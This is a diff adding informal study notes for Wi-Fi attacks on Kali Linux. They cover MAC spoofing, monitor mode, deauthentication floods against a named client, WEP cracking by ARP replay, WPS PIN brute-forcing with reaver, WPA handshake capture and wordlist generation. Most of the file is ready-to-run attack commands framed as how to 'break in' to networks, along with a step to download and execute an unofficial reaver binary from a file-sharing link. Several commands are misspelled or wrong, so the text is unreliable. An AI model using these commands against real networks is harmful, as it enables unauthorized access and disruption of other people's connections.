@@ -1,0 +1,170 @@
+apt-get update
+man - manual
+-l - for lomg listing
+apt-get install terminator
+timedatectl set-time '2020-10-13 01:16:00'
+timedatectl set-timezone 'Asia/Kolkata'
+
+ifconfig
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+ifconfig
+
+Fix MAC Address Reverting to the Original
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+if your network change your created mac address automatically to default then-
+========================================================
+then open your terminal
+.
+---------------------------------------------------------
+leafpad  /etc/networkmanager/networkmanager.conf
+---------------------------------------------------------
+this will open the notepad of networkmanager in kali
+then add the below code so that the mac address will not change even if you have not restarted your pc..
+after 1line add this 
+-----------------------------------------
+[device]
+wifi.scan-rand-mac-address=no
+
+[connection]
+ethernet.cloned-mac-address=preserve
+wifi.cloned-mac-address=preserve
+----------------------------------------
+then restart the network manager by command
+
+---------------------------------
+service network-manager restart
+---------------------------------
+
+To enable monitor mode
+-------------------------
+
+iwconfig
+ifconfig wlan0 down
+airmon-ng check kill (it kills the process which interrupt for monitor mode)
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig (to check)
+
+---------------------------
+ANATHOR METHOD
+---------------------------
+ifconfig wlan0 down
+airmon-mg check kill
+airmon-mg start wlan0 ( by using this command airmon-mg started on wlan0 as wlan0mon)
+
+============================
+packect sniffing using airodump-ng
+-----------------------------------
+it is a part of aircrack-ng suit
+airodump-ng is a packet sniffer
+used to capture packects within a range
+display detailed about networks arrond us
+
+
+-----------------------------------
+to see info about wireless networks
+
+- airodump-ng wlan0 (for 2.4gz band only)
+-airodump-ng --band a wlan0 (for 5gz band only)
+-airodump-ng --band abg wlan0 ( works for both 2.4 and 5 gz bands)
+-airodump-ng --bssid 22:3D:ED:DE:1E:B4 --channel 5 --write test wlan0
+-wireshark
+---------------------------------------
+for deauthenticate a network
+----------------------------------------
+aireplay-ng --deauth 100000000000 -a 22:3D:ED:DE:1E:B4 (routeraddress) -c D0:C5:D3:42:32:81 (target client mac address) wlan0
+----------------------------------------
+airodump-ng --bssid 22:3D:ED:DE:1E:B4 (router mac address)--channel 5 (connected channel name) wlan0 #(to see the pwr and the working of the process)
+
+=============================================
+wep cracking
+---------------
+airodump-ng to capture the vdata 
+and use aircrack-ng to analysis the data
+
+
+1/ how to braek in to a busy network (continous data packets)
+===========================
+
+- airodump-ng wlan0
+coppy the bssid of the wep network
+
+to collect data from wep
+-airodump-ng --bssid 22:3D:ED:DE:1E:B4(specific bssid) --channel 5 --write basic_wep(collect data file name) wlan0
+
+file will captured
+
+aircrack-ng basic_wep-01.cap (captured cap file name for data crack)
+
+then you will find the key and copy the key the remove the colon (:) in it the use it as password
+
+2/ how to braek in to a stable network (data packects formation slow so that we have to enough time to crack the password)
+============================
+way-
+force the AP to generate new ivs so that itwill be easier to crack
+
+airodump-ng --bssid 22:3D:ED:DE:1E:B4(specific bssid) --channel 5 --write aireplay(collect data file name) wlan0
+
+to associate with router (but in this step you can't crack only you can associate with it)
+-------------------------
+aireplay-ng --fakeauth 0 -a 22:3D:ED:DE:1E:B4 (router mac of bssid) -h D0:C5:D3:42:32:81 (mac address of wlan0 or wireless adaptor) wlan0
+
+then apply arp request and reply method:-
+-------------------------------------------
+aireplay-ng --aireplay -b 22:3D:ED:DE:1E:B4 (router mac of bssid) -h D0:C5:D3:42:32:81 (mac address of wlan0 or wireless adaptor) wlan0
+
+then wait for some time to capture an arp and retransmission
+then reassociate with it by 
+aireplay-ng --fakeauth 0 -a 22:3D:ED:DE:1E:B4 (router mac of bssid) -h D0:C5:D3:42:32:81 (mac address of wlan0 or wireless adaptor) wlan0
+
+then use aircrack-ng to crack the password.
+
+aircrack-ng aireplay.cap (captured cap file name for data crack)
+====================================================
+
+WPA AND WPA2 CRACKING 
+===================
+WPA USES Temporal Key Integrity Protocol OR (TKIP)
+
+WHERE WPA2 USES CCMP PROTOCOL OR Counter Mode Cipher Block Chaining Message Authentication Code Protocol
+--------------------------------
+TO SEE THE NETWORK ENABLED WITH WPS
+---------------------------------------------
+wash --interface wlan0
+
+THEN- THIS COMMAND USED TO CAPTURE DATA AND MAKE A BRUTEFORCE ATTACK TO GET PIN AND PSK
+---------------------------------------------------------------------------------------------------
+reaver --bssid 46:E4:EE:0C:AF:79(TARGET ROUTER) --channel 1 --interface wlan0 -vvv --no-associate
+
+THEN RUN-  aireplay-ng --fakeauth 30 -a 46:E4:EE:0C:AF:79 -h 96-F2-3C-86-CA-C5 wlan0
+------------------------------------------------------TO ASSOCIATE WITH ROUTER
+
+/////////////////////////////////////////////////////////////////////////////////////////////
+IF NAY FAILURE HAPPENS WITH REAVER COMMAND THEN DOWLOAD THE OLDER VERSION FROM- 
+https://ufile.io/lro4nkdv
+IT WILL DOWNLOADED TO DOWNLOAD THE CD INTO IT
+THEN WE HAVE TO MAKE IT AS EXECUTABLE FILE SO THAT WE NEED A COMMAND I.E--
+chmod +x reaver
+TO RUN THIS OLD REAVER WE HAVE TO BE IN THAT FOLDER AND MUST HAVE TO USE ./ OPERATOR BEFORE REAVER CMD SO THAT IT WILL EXECUTE THE DOWNLOADED REAVER NOT THE DEFAULT REAVER... I.E
+
+./reaver --bssid 46:E4:EE:0C:AF:79(TARGET ROUTER) --channel 1 --interface wlan0 -vvv --no-associate
+
+================================================================
+
+WPA AND WPA 2 CRACKING USING WORDLIST ATTACK
+--------------------------------------------------------
+''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+airodump-ng wlan0  -- TO CHECK THE NETWORK AND TARGET BSSID AND CHANNEL
+
+airodump-ng --bssid 96:37:49:3D:6A:2B --channel 11 --write saswat wlan0
+ (COLLECTED  DATA FILE WHEN A NEW NETWORK CONNECTED TO THE TARGET APOR U CAN US ETHE DEAUTH ATTACK TO DISCOONECT AN RECONNECT SO THAT HANDSHAKE FILE CAN BE CAPTURED)
+
+TO CRAETE A WORDLIST OF PASSWORDS:-
+================================
+crunch 8 8 1234abcd -o motapa.txt -t d@@@@@1
+
+
+
